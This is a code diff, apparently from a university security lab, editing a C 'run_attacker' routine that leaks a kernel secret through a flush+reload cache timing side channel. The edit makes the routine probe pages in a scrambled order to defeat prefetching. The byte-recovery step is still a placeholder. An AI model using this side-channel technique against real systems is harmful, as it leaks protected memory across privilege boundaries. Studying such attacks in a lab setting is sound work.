@@ -48,11 +48,9 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     printf("Launching attacker\n");
     //printf("shared memory start: %p\n", shared_memory);
     
-    
     //warm-up
     for (int i = 0; i < 100000; i++)
         junk = 2*i + 1;
-    
     
     asm volatile("mfence\n\t":::);	
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
@@ -65,14 +63,15 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // leaked_byte = ??
         
         for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
-            clflush(&shared_memory[LAB2_PAGE_SIZE * i]);
+            int mix_i = ((i * 167) + 13) & 255;
+            clflush(&shared_memory[LAB2_PAGE_SIZE * mix_i]);
 
             asm volatile("mfence\n\t":::);	
             call_kernel_part1(kernel_fd, shared_memory, current_offset);
             call_kernel_part1(kernel_fd, shared_memory, current_offset);
             call_kernel_part1(kernel_fd, shared_memory, current_offset);
 
-            time[i] = time_access(&shared_memory[LAB2_PAGE_SIZE * i]);
+            time[mix_i] = time_access(&shared_memory[LAB2_PAGE_SIZE * mix_i]);
         }
 
         asm volatile("mfence\n\t":::);
